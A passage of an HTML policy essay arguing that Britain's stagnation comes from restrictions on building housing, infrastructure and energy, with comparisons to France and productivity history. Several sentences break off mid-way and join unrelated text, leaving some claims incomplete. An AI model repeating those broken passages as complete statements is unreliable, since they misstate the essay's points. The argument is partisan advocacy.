            Here are some facts to set the scene about the state of the British
            economy.
          </p>
          <ul>
            <li>
              Between 2004 and 2021, before Russia’s invasion of Ukraine,
              <a href="https://www.gov.uk/government/statistical-data-sets/gas-and-electricity-prices-in-the-non-domestic-sector">the industrial price of energy tripled in nominal terms</a>, or doubled relative to consumer prices.
            </li>
            <li>
              With almost identical population sizes, the UK has under
              <a href="https://www.ons.gov.uk/peoplepopulationandcommunity/housing/articles/researchoutputssubnationaldwellingstockbytenureestimatesengland2012to2015/2020">30 million homes</a>, while France has around
              <a href="https://www.insee.fr/en/statistiques/5009609">37 million</a>.
              <a href="https://www.gov.uk/government/statistics/english-housing-survey-2021-to-2022-second-homes-fact-sheet/english-housing-survey-2021-to-2022-second-homes-fact-sheet">800,000 British families</a>
              have second homes compared to
              <a href="https://www.thelocal.fr/20240712/explained-why-so-many-french-people-have-second-homes">3.4 million French families</a>.
            </li>
            <li>
              Per capita electricity generation in the UK is just two thirds of
              what it is in France (4,800 kilowatt-hours per year in Britain
              versus 7,300 kilowatt-hours per year in France) and barely over a
              third of what it is in the United States (12,672 kilowatt-hours
              per year). We are
              <a href="https://ourworldindata.org/grapher/per-capita-electricity-source-stacked">closer to developing countries like Brazil and South Africa</a>
              in terms of per capita electricity output than we are to Germany,
              China, Japan, Sweden, or Canada.
            </li>
            <li>
              Britain’s last nuclear power plant
              <a href="https://www.imeche.org/policy-and-press/from-our-perspective/energy-theme/nuclear-power/about-nuclear-power/nuclear-uk/britains-most-recent">was built between 1987 and 1995</a>. Its next one,
              <a href="https://www.samdumitriu.com/p/how-to-get-new-nuclear-built-faster">Hinkley Point C, is between four</a>
              and
              <a href="https://www.britainremade.co.uk/plan#plan_energy">six times</a>
              more costly per megawatt of capacity than South Korean nuclear
              power plants, and
              <a href="https://www.world-nuclear-news.org/Articles/KHNP-selected-to-supply-new-Czech-nuclear-units">four times as expensive</a>
              as those that South Korea’s KEPCO has agreed to build in Czechia.
            </li>
            <li>
              Tram projects in Britain are
              <a href="https://www.samdumitriu.com/p/britains-infrastructure-is-too-expensive">two and a half times more expensive</a>
              than French projects on a per mile basis. In the last 25 years,
              France has built
              <a href="https://assets.nationbuilder.com/britainremade/pages/1451/attachments/original/1723813389/BRM7607_Tram_Report_Digital-Single-Pages_AWK.pdf?1723813389">21 tramways</a>
              in different cities, including cities with populations of just
              150,000, equivalent to Lincoln or Carlisle. The UK has still not
              managed to build a tramway in Leeds, the largest city in Europe
              without mass transit, with a population of nearly 800,000.
            </li>
            <li>
              At £396 million,
              <a href="https://x.com/Sam_Dumitriu/status/1694990889787986094">each mile of HS2 will cost more than four times more</a>
              than each mile of the Naples to Bari high speed line. It will be
              more than eight times more expensive per mile than France’s high
              speed link between Tours and Bordeaux.
            </li>
            <li>
              Britain
              <a href="https://www.newcivilengineer.com/latest/the-challenge-of-building-more-reservoirs-to-ensure-uks-water-resilience-01-09-2022/">has not built a new reservoir since 1992</a>. Since then, Britain’s population has grown by 10 million.
            </li>
            <li>
              Despite huge and rising demand, Heathrow annual flight numbers
              <a href="https://en.wikipedia.org/wiki/Heathrow_Airport#/media/File:London_Heathrow_Statistics.png">have been almost completely flat since 2000</a>. Annual passenger numbers have risen by 10 million because
              planes have become larger, but this still compares poorly to the
              22 million added at Amsterdam’s Schiphol and the 15 million added
              at Paris’s Charles de Gaulle. The right to take off and land at
              Heathrow once per week is worth
              <a href="https://cepr.org/voxeu/columns/it-time-auction-slots-congested-airports">tens of millions of pounds</a>.
            </li>
            <li>
              The planning documentation for the Lower Thames Crossing, a
              proposed tunnel under the Thames connecting Kent and Essex, runs
              to 360,000 pages, and the application process alone has cost £297
              million. That is
              <a href="https://www.samdumitriu.com/p/a-boring-story-about-infrastructure">more than twice as much</a>
              as it cost in Norway to <em>actually build</em> the longest road
              tunnel in the world.
            </li>
          </ul>
          <p>
            These are not just disconnected observations. They highlight the
            most important economic fact about modern Britain: that it is
            difficult to build almost anything, anywhere. This prevents
            investment, increases energy costs, and makes it harder for
            productive economic clusters to expand. This, in turn, lowers our
            productivity, incomes, and tax revenues.
          </p>
          <p>
            Everyone reading this will already be aware of the country’s present
            economic sclerosis. Real wage growth has been flat for 16 years.
            Average weekly wages are only
            <a href="https://www.ons.gov.uk/employmentandlabourmarket/peopleinwork/earningsandworkinghours/datasets/averageweeklyearningsearn01">0.8 percent</a>
            higher today than their previous peak in 2008. Annual real wages are
            <em>6.9 percent lower</em> for the median full-time worker today
            than they were in 2008. This essay argues that Britain’s economy has
            stagnated for a fundamentally simple reason: because it has banned
            the investment in housing, transport and energy that it most vitally
            needs. Britain has denied its economy the foundations it needs to
            grow on.
          </p>
          <p>
            From 2010 to the summer of 2024, Britain was run by Conservative-led
            or Conservative Governments. The Conservatives are the traditional
            party of business, and in the 1930s and 1980s they pushed through
            reform programmes that successfully renewed Britain’s economy.
            Virtually any Conservative minister from the past fourteen years
            would speak warmly about that heritage if asked, and would express
            the hope of being its inheritor. And yet, with honourable
            exceptions, the governments of the last fourteen years failed in
            this vocation. Failing systems remained unreformed, continuing to
            stifle Britain’s prosperity. Today Britain is ruled by a Labour
            Government that recognises this failure to build, and which has
            articulated high ambitions for changing this. But it remains
            doubtful that they will be any better at delivering on those
            ambitions than the Conservatives were.
          </p>
          <p>
            Constitutionally, British governments have immense power. How has a
            series of governments with both the will and the means to deliver
            systemic reform failed to do so? How can it be that the overwhelming
            experience reported by former ministers and advisors is one of
            disempowerment – of a ‘blob’ operating beyond their control, of
            pulling levers and nothing happening, of a vast dysfunctional
            machine slowly disintegrating on autopilot?
          </p>
          <p>
            We believe that Britain’s political elites have failed because they
            do not understand the problems they are facing. No system can be
            fixed by people who do not know why it is broken. Like the elites of
            Austria-Hungary, Qing Dynasty China, or the Polish Commonwealth,
            they tinker ineffectually, mesmerised by the uncomprehended disaster
            rising up before them.
          </p>
          <p>
            If any government, Conservative or Labour, wishes to use its powers
            to improve the country, it needs to understand which of Britain’s
            institutions have failed, and why they have done so. Only then can
            they begin to develop a systematic programme of reform that will
            restore Britain’s economy to strength and its society to vitality.
            The alternative is continued drift, relative decline, political
            disenchantment, and a nation unable to meet the great challenges of
            our time. This essay is a first attempt at offering such a
            diagnosis.
          </p>
          <h3 id="falling-behind">Falling behind</h3>
          <p>
            Britain is a country of immense achievement. For most of modern
            history, its people were the richest, healthiest and best educated
            in the world. Its housing stock and its infrastructure was far more
            advanced than those of any of its rivals. It led the Scientific and
            Industrial Revolutions. Its institutions were almost uniquely
            liberal. Though British history contains its share of missteps and
            tragedies, there is probably nowhere else on earth that matches its
            achievements since the mid-eighteenth century, relative to its size
            and resource endowments.
          </p>
          <p>
            Many of these underlying strengths remain. The British people value
            debate and heterodoxy. They respect science, law and institutions.
            In hours of crisis, like the Russian invasion of Ukraine, they
            display unity and good sense. However inefficient and dysfunctional
            they may be, British institutions are strikingly incorruptible. One
            of the scandals of the decade is the alleged embezzlement of a
            campervan, an offence that would surely bring a contemptuous smile
            to the lips of a Putin or a Berlusconi.
          </p>
          <p>
            Despite these strengths, Britain is falling behind the developed
            world in economic dynamism. It led the world in the nineteenth
            century, and then Europe during the first half of the twentieth, but
            it lost its leadership after the Second World War. Since 2008, it
            has been clearly underperforming most of the developed world, even
            some of its more heavily taxed and regulated continental neighbours.
          </p>
          <p>
            Most popular explanations for this are misguided. The Labour
            manifesto
            <a href="https://labour.org.uk/change/kickstart-economic-growth/">blamed slow British growth on a lack of ‘strategy</a>’ from the Government, by which it means not enough targeted
            investment winner picking, and too much inequality. Some economists
            <a href="https://www.ft.com/content/6da72060-cfd2-11e9-99a4-b5ded7a7fe3f">say that the UK’s economic model of private capital ownership is
              flawed</a>, and
            <a href="https://www.ft.com/content/a8fcf263-8506-4b1c-aace-3d3d1743dc55">that limits on state capital expenditure are the fundamental
              problem</a>. They also point to more state spending as the solution, but
            ignore that this investment would face the same barriers and high
            costs that existing infrastructure projects face, and that deters
            private investment.
          </p>
          <p>
            Others believe that our ageing society means permanently lower
            growth and higher taxes. Dietrich Vollrath’s book
            <em>Fully Grown: Why a Stagnant Economy is a Sign of Success</em>
            <a href="https://blogs.lse.ac.uk/europpblog/2020/02/26/slow-economic-growth-is-a-sign-of-success/">says that slower growth is an inevitable part of becoming
              services-driven</a>
            (and of birth rates declining). Another school of thought sees
            Britain’s 2010s performance as ‘one thing after another’, with a
            slow recovery from the financial crisis followed by Brexit, followed
            by Covid.
          </p>
          <p>
            But all of these explanations take the biggest obstacles to growth
            for granted. Our economy isn’t growing for the same reason that no
            more planes take off or land at Heathrow today than did twenty years
            ago: at some point it becomes impossible to grow when investment is
            banned.
          </p>
          <p>
            Over the past two decades, Britain’s economy has needed a huge
            quantity of new housing, transport infrastructure and energy supply.
            Its postwar institutions have manifestly failed to deliver these.
            Britain is now a place in which it is far too hard to build houses
            and infrastructure, and where energy is too expensive. This has
            meant that our most productive industries have been starved of the
            resources, investment and talent – the economic foundations – that
            they need to grow.
          </p>
          <p>
            The UK faces other challenges besides these. Our healthcare and
            higher education systems are so broken that politicians
            <a href="https://yougov.co.uk/topics/politics/trackers/how-the-government-is-handling-the-issue-of-immigration-in-the-uk">elected on a clear mandate to cut migration</a>
            instead let it rise to unprecedented levels to keep them afloat.
            Crime,
            <a href="https://www.ons.gov.uk/peoplepopulationandcommunity/crimeandjustice/bulletins/crimeinenglandandwales/yearendingmarch2024">though it has been falling for years</a>, is substantially higher than it was in pre-Second World War
            Britain, despite a far older population. It is also significantly
            higher than in many other European countries including the
            Netherlands, Spain, Austria, Switzerland, Norway, and Italy.
            Childcare is so expensive that many families have fewer children,
            and later in life, than they would like. Our tax system is
            <a href="https://ifs.org.uk/mirrlees-review">riddled with distortions</a>
            and perverse incentives. There is no consensus about what our higher
            education system is supposed to do, who should benefit from it, and
            who should pay. And our political institutions are sclerotic: at
            best, many are unable to perform their most basic functions; at
            worst, they are a huge barrier to innovation and effective
            governance.
          </p>
          <p>
            But these other challenges do not explain why a huge economic gap
            opened up between us and other leading economies, since problems in
            immigration, crime, childcare, tax, and political institutions are
            also found in exactly the countries that have pulled away from
            Britain economically since 2008. Nor can austerity or the hangover
            from the financial crisis explain Britain’s malaise. The financial
            crisis was at least as turbulent in the United States as here. And
            austerity was at least as tough across Europe, which also had to
            fend with the euro crisis.
          </p>
          <p>
            The Office for Budget Responsibility’s estimate of the impact of
            Brexit says
            <a href="https://obr.uk/forecasts-in-depth/the-economy-forecast/brexit-analysis/#assumptions">that it will knock four percent off long-run UK productivity</a>. This would be very painful, but still only a small fraction of
            the growth we have missed over the past fifteen years. (It also does
            not factor in the positive effect of avoiding destructive
            regulations like the EU Artificial Intelligence Act and Digital
            Markets Act.)
          </p>
          <p>
            Britain’s startling underperformance more recently is explained by
            the more basic factors this document focuses on: preventing
            investment into housing, infrastructure, and energy supply.
          </p>
          <p>
            Prosperity is intrinsically important. It gives people security and
            dignity, leisure and comfort, opportunity and economic freedom. It
            gives us freedom to pursue our other national goals: caring for
            older and less fortunate members of society, upholding a
            law-governed international order, preserving and enhancing our
            landscapes and townscapes, and leading the way in world-changing
            scientific research.
          </p>
          <p>
            But there is even more at stake here than that. We noted above the
            enduring strengths of the British social settlement –
            responsibility, autonomy, love of debate, respect for the
            individual. Economic failure saps confidence in these things. It
            begets dependency, resentment, defeatism, division and bitterness.
            It turns win-win relationships into zero-sum ones, where someone
            else must fail for you to succeed. Economic reform is not only the
            key to prosperity: it is the key to preserving and amplifying what
            is valuable about our society itself.

            A short history of British productivity
          </h4>
          <p>
            Britain’s biggest problem is its low productivity – that is, the
            value of the goods and services people produce per hour they work.
            Before the pandemic Americans were
            <a href="https://www.imf.org/external/datamapper/PPPPC@WEO/USA/GBR">34 percent richer than us</a>
            in terms of GDP per capita adjusted for purchasing power, and

(Purchasing power parity, or PPP, attempts to account for
            differences in purchasing power between countries, rather than just
            using exchange rates). The gap has only widened since then:
            <a href="https://data-explorer.oecd.org/vis?tm=labour%20productivity&amp;pg=0&amp;snb=86&amp;vw=tb&amp;df%5Bds%5D=dsDisseminateFinalDMZ&amp;df%5Bid%5D=DSD_PDB%40DF_PDB_LV&amp;df%5Bag%5D=OECD.SDD.TPS&amp;df%5Bvs%5D=1.0&amp;dq=.A.GDPHRS..USD_PPP_H.Q...&amp;pd=2019%2C&amp;to%5BTIME_PERIOD%5D=false">productivity growth between 2019 and 2023 was 7.6 percent in the
              United States, and 1.5 percent in Britain</a>. This is not a general Western European problem either: the French
            and Germans
            <a href="https://data-explorer.oecd.org/vis?tm=labour%20productivity&amp;pg=0&amp;snb=86&amp;vw=tb&amp;df%5Bds%5D=dsDisseminateFinalDMZ&amp;df%5Bid%5D=DSD_PDB%40DF_PDB_LV&amp;df%5Bag%5D=OECD.SDD.TPS&amp;df%5Bvs%5D=1.0&amp;dq=.A.GDPHRS..USD_PPP_H.V...&amp;pd=2019%2C&amp;to%5BTIME_PERIOD%5D=false">are 15 percent and 18 percent more productive than us</a>
            respectively.
          </p>
          <p>
            Historically, this is exceptional. For most of modern history,
            Britain has been more productive than its peers, and when it has
            started to fall behind, it has successfully reformed itself to
            regain its advantage. Between the mid-eighteenth century and the
            late nineteenth century, Britain was the world’s leading economy.
            <a href="https://worksinprogress.co/issue/the-decline-and-fall-of-britain/">Though it was overtaken by the United States by the beginning of
              the twentieth century</a>, it remained Europe's leading economy until the early 1950s,
            with the continent’s highest productivity and living standards, and
            its most advanced innovating firms.

            Privatisation, tax cuts, and the curbing of union power fixed
            important swathes of the UK economy. Crucially, they tackled chronic
            underinvestment in sectors that had been neglected under state
            ownership. Political incentives under state ownership encouraged
            underfunding – and where the Treasury did put money in, it tended to
            go on operational expenditures (e.g., unionised workers’ wages
            rather than capital investments). This problem has
            <a href="https://www.bbc.co.uk/news/articles/cp9rxdrj713o">immediately reemerged</a>
            as the
            <a href="https://capx.co/the-eastern-solution-to-the-southern-rail-problem/">Department for Transport has begun to nationalise various
              franchises</a>

          </p>
          <p>
            Between 1980 and 2008 Britain returned to its position as one of
            Europe’s most successful large economies. For the most part, Tony
            Blair’s governments were able to sustain these advances. In 2005
            Britain’s GDP per capita was
            <a href="https://ourworldindata.org/grapher/gdp-per-capita-worldbank?tab=chart&amp;country=DEU~GBR">just 2.8 percent behind Germany’s, in purchasing power parity
              terms</a>, and fully
            <a href="https://www.imf.org/external/datamapper/NGDPDPC@WEO/GBR/DEU">20 percent <em>higher</em></a>
            in US dollar terms, according to the World Bank. Penn World Tables,
            the other major source, have the UK <em>overtaking</em> Germany on
            GDP per capita in the mid-2000s.
          </p>
          <p>
            Britain’s relative success during this period is clearest when
            compared to other major economies. The chart below shows GDP per
            capita in France, Germany, Italy and the UK as a percentage of US
            GDP per capita. It shows Britain, after decades of relative
            stagnation, beginning to converge on the United States and overtake
            the other European countries from the early 1980s. Britain’s change
            of fortunes under Thatcher, and continued improvement under Blair,
            is clear.
          </p>
          
          <p>
            But crucial parts of the economy were still left unfixed – notably
            land-use planning policy,
            <a href="https://conservativehome.com/2021/05/14/ben-southwood-why-planning-reform-may-work-this-time-round-delivering-us-the-new-homes-that-we-need/">which Thatcher’s Environment Secretary Nicholas Ridley had tried
              and failed to reform</a>, and which Tony Blair’s government was unable to make a dent in
            either.
          </p>
          <p>
            This left Britain with latent weaknesses that have become hugely
            problematic over the last quarter of a century. Since the 1990s,
            Britain has experienced rapid population growth, after decades of
            demographic stability, and big shifts in prosperity from some parts
            of the country to others. The decision to transition away from
            fossil fuels has created the need for huge quantities of new energy
            infrastructure, recently exacerbated by the war in Ukraine, but by
            no means beginning then. Across the developed world, great
            metropolitan agglomerations have become even more economically
            important. London has been among the biggest winners from this
            trend, in spite of the obstacles in its way.
          </p>
          <p>
            What Britain needed in the last 25 years above all was a huge amount
            of building – of homes, energy supply, and transport infrastructure.
            Without it, Britain has fallen behind, weighed down by a development
            system that
            <a href="https://worksinprogress.co/issue/britains-forgotten-financial-crisis/">worked badly even in the 1950s and 60s</a>, and that is positively disastrous today.
          </p>
          
          <p>
            That gap continues to grow. Between 2010 and 2019, worker
            productivity grew by eight percent in the United States, 9.6 percent
            in France and just 5.8 percent in Britain. And those countries’
            growth rates pale in comparison to that of Poland, which has grown
            its productivity by 29.7 percent between 2010 and 2019, and on
            current trends will overtake Britain by the end of this decade.
          </p>
          <p>
            To put the shortfall since 2008 into perspective, if Britain had
            grown in line with its trend between 1979 and 2008, it would be 24.8
            percent more productive today. Assuming we continued working the
            same hours annually, that would mean a GDP per capita of £41,800
            instead of £33,500, making the typical family about £8,700 better
            off before taxes and transfers. Tax revenues would be £1,282 billion
            instead of £1,027 billion, assuming tax rates are held constant.
            That would mean that, instead of a deficit of £85 billion, on
            current spending we would have a surplus of £170 billion, meaning
            that taxes could be much lower, and public services could be better
            funded.
          </p>
          <p>
            Though these figures may seem improbably high, they are not out of
            line with the world’s richest economies, and there is no reason
            Britain should not aim to sit among them as it once did. This essay
            argues that Britain can do so by adopting a programme of reform
            similar in its scale of ambition to that of the programme of
            liberalisation in the 1980s. Where earlier reforms were focused on
            cutting taxes, curbing the power of the trade unions, and
            privatising state-run industries, this time we must focus on making
            it easier to invest in homes, labs, railways, roads, bridges,
            interconnectors, and nuclear reactors.

            France is notoriously heavily regulated and dominated by labour
            unions. In 2023, the country was brought to a standstill by strikes
            against proposals to raise the age of retirement from 62 to 64.
            French workers have been known to strike by
            <a href="https://www.theguardian.com/world/2009/mar/26/3m-france-boss-kidnapping">kidnapping</a>

            – and strikes are so common that French unions have designed special
            barbecues that fit in tram tracks so they can grill sausages while
            they march.
          </p>

          </p>
          <p>
            France is notoriously heavily taxed. Factoring in
            <a href="https://stats.oecd.org/Index.aspx?DataSetCode=TABLE_III2">employer-side taxes</a>
            in addition to those the employee actually sees, a French company
            <a href="https://x.com/s8mb/status/1742980931051479522">would have to spend €137,822</a>
            on wages and employer-side taxes for a worker to earn a nominal
            salary of €100,000, from which they would take home €61,041. For a
            British worker to take home the same amount after tax (£52,715,
            equivalent to €61,041), a British employer would only have to spend
            €97,765.33 (£84,435.6) on wages and employer-side taxes.
          </p>
          <p>
            And yet, despite these high taxes, onerous regulations, and powerful
            unions, French workers are significantly more productive than
            British ones – closer to Americans than to us. France’s GDP per
            capita is only about the same as the UK’s because French workers
            take more time off on holiday and work shorter hours.
          </p>
          <p>
            What can explain France’s prosperity in spite of its high taxes and
            high business regulations? France can afford such a large,
            interventionist state because it does a good job building the things
            that Britain blocks: <strong>housing</strong>,
            <strong>infrastructure</strong> and <strong>energy supply</strong>.
          </p>
          <p>
            Housing supply is vastly freer in France. Overall, it now has about
            seven million more homes than Britain (<a href="https://www.insee.fr/en/statistiques/5009609">37 million</a>
            versus
            <a href="https://www.ons.gov.uk/peoplepopulationandcommunity/housing/articles/researchoutputssubnationaldwellingstockbytenureestimatesengland2012to2015/2020">30 million</a>), with the same number of people. Those homes are newer, and are
            more concentrated in the places people want to live: its prosperous
            cities and holiday regions.

            France has allowed its other great cities to grow and flourish too,

            Transport infrastructure is now better there: there are seven
            British tram networks, versus 29 in France. Six French cities have
            underground metro systems, against three in Britain. Since 1980,
            France has opened 1,740 miles of high speed rail, compared to just
            67 miles in Britain. France has nearly 12,000 kilometres of
            motorways versus around 4,000 kilometres here – and French motorways
            tend to be smoother and better kept (and three quarters are tolled,
            making congestion much less of a problem). In the last 25 years

            Energy is more abundant and, thanks to the country’s nuclear
            roll-out from the 1970s, the country has already done a lot of
            decarbonisation.
            <a href="https://world-nuclear.org/information-library/country-profiles/countries-a-f/france.aspx">Seventy percent of the country’s electricity comes from nuclear
              power</a>, which does not suffer from the intermittency problems that wind

            Because France gets these big things right, it can afford to get a
            lot of other things wrong. If Britain could catch up with France on
            housing, infrastructure and energy, without making the sort of
            mistakes it makes on regulation and tax, the implication is that we
            could be far richer than they are, as we were for centuries before
            the 1950s.

            Britain gets many of the important things for prosperity right.
            Businesses from around the world come here to draw on our legal
            regime, low levels of corruption, centuries-old commitment to free
            trade, efficient financial sector, and world-leading scientific
            research ecosystem. Our time zone allows us to talk to Asia, Africa,
            and the Americas all in one day, and everyone here is fluent in the
            modern world’s
            <a href="https://en.wikipedia.org/wiki/Mediterranean_Lingua_Franca"><em>lingua franca</em></a>. As the economist Tyler Cowen said, England remains ‘<a href="https://www.ft.com/content/1e6d106c-8462-4691-9c4b-eb57afec9907">one of the few places where you can really birth and execute a
              new idea</a>’. This is unbelievably precious, rare, and difficult to create.
          </p>
          <p>
            But we fail to capitalise on these rare advantages because the
            economy lacks the most important foundations: private investment is
            blocked from going where it could generate the highest returns,
            meaning we have lower investment than all our peer economies; in
            particular we do not allow investment in the infrastructure we need
            to allow people to access prosperous areas, the houses they need to
            live there, and the offices, labs, factories, and warehouses they
            need to work there, which, together with our high and rising energy
            costs, stop the companies in those cities reaching their full
            potential.

          <p>
            Britain’s best chance of achieving rapid economic growth in the near
            term is via a combination of higher private
            <strong>investment,</strong> more <strong>agglomeration</strong> –
            that is, greater clustering of economic activity in productive
            places – and lower <strong>energy costs</strong>.
          </p>
          <p>
            These economic foundations are important determinants of how
            productive workers and businesses are.
          </p>
          <p>
            No individual by themselves can create much value, no matter how
            gifted or hardworking they might be. They need to combine their
            efforts with machinery and other people to really succeed.
            Investment rates determine the amount and quality of the tools they
            can use; energy costs determine how they can use them; and
            agglomeration – including both housing and infrastructure –
            determines who they can use them with.

          </p>
          <p>
            These policies are a complement to Britain’s most advanced frontier
            sectors. More agglomeration drives higher rates of innovation, and
            increases the choices that businesses have about who to hire. Lower
            energy costs make certain high-tech sectors more viable, such as
            advanced manufacturing and AI training. Higher rates of investment
            into businesses make it easier for smaller companies to rapidly
            scale up into giants.

          <p>
            Rapid economic growth is possible for Britain. Because what we get
            wrong is so mundane and straightforward, fixing these problems would
            allow Britain to experience similar rapid
            <a href="https://www.sambowman.co/p/britain-is-a-developing-country">‘catch-up’ growth</a>
            that countries like South Korea, Estonia, and Poland have
            experienced over the past thirty years.
          </p>
          <h3 id="investment">Investment</h3>
          <p>
            Investment is when we forgo resources that we would consume today,
            and instead use them to produce more resources in the future. It is
            the life-blood of economic growth, and of individual businesses’
            successes. Investment is not just what happens after we build
            sufficient roads, houses, pylons, and power plants: building those
            things <em>is</em> investment.
          </p>
          <p>
            What is good about building these things is not that they cost
            money, and what matters is not how much money we spend on
            investment. It is the things we actually produce, and the benefits
            they give us, that are valuable: the easier and less expensive it is
            to build them, the higher the return we get for a given amount of
            money invested, and the better it is to spend money on them.
          </p>
          <p>
            Britain does invest at a lower rate than most other advanced
            countries. In 2022, France spent (across both public bodies and
            private companies) 26 percent of its GDP on physical capital
            investment; Germany 25 percent; OECD members 23 percent on average;
            the United Kingdom just 19 percent. The total capital stock of the
            UK is actually lower now than it was in 2016; by comparison, it is
            14 percent higher on average across the rest of the G7.
          </p>
          <p>
            The most important reason for this is not that we are inherently
            penny-pinching and short-termist, where Americans and Europeans are
            not. It is that we have banned most of the most productive
            investments we could make, made it eye-wateringly expensive to do
            the ones we do allow ourselves to make, and allowed many
            publicly-managed assets to be neglected.

            These problems have been present for more than half a century. In
            the postwar decades, the British state chronically failed to invest
            in the various companies it had nationalised, succumbing to the
            permanent temptation of politicians to allocate resources to
            frontline services (i.e. immediate consumption) rather than
            investing for the long term. We see this every year with the NHS,
            whose operational budget continues to rise, but
            <a href="https://inthesightoftheunwise.substack.com/p/episode-twenty-two-the-big-nhs-problem">which has the fewest MRI and CT scanners of any developed
              country’s healthcare system, and by far the least machinery and

            between London and Manchester as did private franchises by the 2010s
            – overall passenger numbers fell steadily between nationalisation in
            1948 and privatisation in 1994,
            <a href="https://x.com/s8mb/status/1783395040296866199">after which point they have more than doubled</a>. Many state-run British industries became efficient in terms of
            economising on the scarce resources they were allowed, but extremely
            inefficient in terms of overall productivity.

            The privatisations of British Steel, British Airways, British Gas,
            British Telecoms and many other nationalised companies in the 1980s
            and 90s thus opened up great opportunities. From 1981 to 1990,
            British capital investment
            <a href="https://data-explorer.oecd.org/vis?tm=gross%20fixed%20capital%20formation&amp;pg=0&amp;snb=74&amp;vw=tb&amp;df%5Bds%5D=dsDisseminateFinalDMZ&amp;df%5Bid%5D=DSD_NAMAIN10%40DF_TABLE1_EXPENDITURE_CPC&amp;df%5Bag%5D=OECD.SDD.NAD&amp;df%5Bvs%5D=1.0&amp;dq=A.AUS%2BAUT%2BBEL%2BCAN%2BCHL%2BCOL%2BCRI%2BCZE%2BDNK%2BEST%2BFIN%2BFRA%2BDEU%2BGRC%2BHUN%2BISL%2BIRL%2BISR%2BITA%2BJPN%2BKOR%2BLVA%2BLTU%2BLUX%2BMEX%2BNLD%2BNZL%2BNOR%2BPOL%2BPRT%2BSVK%2BSVN%2BESP%2BSWE%2BCHE%2BTUR%2BGBR%2BUSA.S1..P51G.N11G......&amp;pd=1981%2C1990&amp;to%5BTIME_PERIOD%5D=false">grew faster than any other country in the OECD</a>
            barring booming Japan and tiny Luxembourg. Contrary to what is
            sometimes claimed, North Sea oil and gas was not the biggest part of
            this, with investment in it
            <a href="https://www.escoe.ac.uk/research/historical-data/national-accounts-2/">actually falling over this period</a>. Investment levels rose chiefly because state mismanagement had
            left so many opportunities untaken in the preceding decades –
            opportunities that privatisation opened up.
          </p>
          <p>
            Underinvestment leads to particularly acute problems in places like
            the North of England that have historically prospered from
            capital-intensive industries. These areas have the same underlying
            features that generate industrial heartlands elsewhere, like in
            Germany and Sweden: relatively cheap land, proximity to waterways,
            roads and rail networks, and – unlike many other parts of Britain –
            cheap, abundant housing. But expensive energy and the difficulty of
            building new premises, warehouses, factories, pipelines, pylons,
            distribution centres, and so on holds them back.
          </p>
          <p>
            Some of this underinvestment is due to
            <a href="https://www.adamsmith.org/blog/full-expensing-the-best-idea-in-politics-youve-never-heard-of">distortions in the tax code</a>
            that penalise capital investments. Prior to the introduction of full
            expensing, British businesses that invested in machinery, buildings
            and acquired patents
            <a href="https://www.samdumitriu.com/p/the-super-deduction">could only claim back 62 percent</a>
            of the costs from their corporation tax bill (compared to 100
            percent for operating expenses like rent or wages), which meant that
            despite the UK having a low headline rate of corporation tax, the
            effective rate on profits generated via physical investments was
            still high. The introduction of full expensing has corrected this
            for some investments, but still does not apply to buildings or
            machinery with an expected lifespan of over twenty-five years.
            Business rates, meanwhile,
            <a href="https://www.ft.com/content/abadf956-dca6-11e5-8541-00fb33bdf038">have the effect of increasing the tax liability when most
              property enhancements are made</a>, regardless of when or if they become profitable.
          </p>
          <p>
            Some of the underinvestment is due to higher input costs, such as
            the high cost of energy, discussed later. This is most acutely a
            problem for the manufacturing sector, where high energy costs have
            made many industries unviable in Britain, while they thrive in other
            advanced economies.
          </p>
          <p>
            But the most important reason Britain sees underinvestment today is
            that the state bans the very investments that would be most
            valuable. If allowed, private investors would be rushing to build
            housing, transport infrastructure and energy infrastructure.

            were originally built this way. If done today, this would show up as
            enormous amounts of capital investment in the national accounts. But
            as we will show, building these things is prohibited in the vast
            majority of cases in which it would be economically rational. If we
            change that, Britain would see an enormous construction boom as
            suppressed demand for these things was met, and the resulting
            capital assets would continue contributing to the economy
            indefinitely.

            Improving the UK’s investment rate would bring great benefits:
            <a href="https://www.amazon.co.uk/Restarting-Future-How-Intangible-Economy/dp/0691211582">about half the shortfall in productivity growth since the
              financial crisis can be attributed to underinvestment in
              (tangible) capital</a>, while much of the rest is likely to be due to the shortfall in
            intangible investments like R&amp;D.

            Investment is what makes us richer over time. Any successful
            economic plan will have to unleash it in order to succeed. But even
            as the need for higher investment becomes more widely accepted by
            Britain’s economic commentators, they tend to propose more quangos
            and subsidies to tackle the problem, because they miss two crucial
            points.
          </p>
          <p>
            First: private investment is far more significant than government
            investment. Public investment can be extremely important, especially
            in areas that have large spillovers to the broad economy, but which
            do not always generate a private return. But more than 80 percent of
            investment in the UK and most other developed countries is done by
            the private sector. Public investment was 18.0 percent of the UK
            total in 2021, 17.6 percent in 2020, and 15.5 percent in 2019.
          </p>
          <p>
            And second: apart from taxes on investment like corporation tax and
            capital gains tax, higher investment in the UK is mainly frustrated
            by systems that effectively ban private companies from doing it
            (like building houses, infrastructure, and energy generation),
            rather than being down to short-sightedness by these businesses, or
            a lack of generosity by government.
          </p>
          <p>
            Commentators have searched far and wide for explanations of
            Britain’s investment problem. But the explanation was before our
            eyes all along. Buildings, energy and transport infrastructure are
            the investments that Britain most needs, and they are largely
            banned. In banning them, we have generated higher costs for a range
            of other investments too. There is no need to posit esoteric
            cultural problems among British businesspeople, no need for a dozen
            more government strategies, deals and consultations. We don’t need
            to pay businesses to invest more. We just need to stop banning them
            from doing so.

            Why we’re not building enough homes in the right places
          </h4>
          <p>
            For centuries, Britain had a development control system that
            supported urban growth in the places with the most successful
            industries, as well as building beautiful cities that we treasure
            today. Since 1947, however, Britain has had probably the most
            restrictive development control system in the world. This has held
            back our strongest sectors and businesses and stopped people from
            moving to the places with the best jobs. On its own, we see it as
            the largest cause of British stagnation.
          </p>
          <p>
            Throughout Britain’s history, its economic centre of gravity has
            changed, sometimes profoundly. During the 1800s, millions of people
            migrated to the cities of the Midlands, Wales, and especially the
            North of England, where the Industrial Revolution was
            revolutionising the world economy. Cardiff grew by around 1,000
            percent in 45 years as people moved near the coal that enabled heavy
            industry. Manchester grew from 90,000 in 1800 to 700,000 in 1900, in
            part due to the soft water that enabled Lancashire’s world-beating
            cotton textiles. Liverpool grew by over 1,000 percent between 1800
            and the 1930s.
          </p>
          <p>
            This process continued in the 1930s, but as different industries
            came to the fore, different locations were predominant. Cities like
            Birmingham, Coventry, London, Leicester, and Nottingham expanded at
            breakneck pace as the link with raw materials was broken, and jobs
            shifted to offices and factories in the South and Midlands. Immense
            suburbs sprang up, with their characteristic long gardens and
            semi-detached houses. Private companies and local councils laid out
